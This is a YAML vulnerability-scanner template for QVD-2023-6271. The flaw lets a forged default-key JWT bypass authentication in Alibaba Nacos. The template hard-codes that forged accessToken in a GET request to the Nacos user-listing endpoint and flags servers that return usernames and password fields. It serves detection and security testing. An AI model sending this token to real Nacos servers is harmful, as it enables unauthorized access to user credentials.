id: nacos-default-token-idor

info:
  name: nacos-default-token-idor
  author: d4rksec
  severity: critical
  verified: true
  description: |
     QVD-2023-6271 This YAML-based Nuclei template checks for a default access token IDOR vulnerability in Alibaba Nacos. The vulnerability allows an attacker to bypass the authentication mechanism and access protected resources.
  
rules:
  r0:
    request:
      method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q
    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.content_type.contains("application/json")
  r1:
    request:
      method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q
    expression: response.status == 200 && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":') && response.content_type.contains("application/json")
expression: r0() || r1()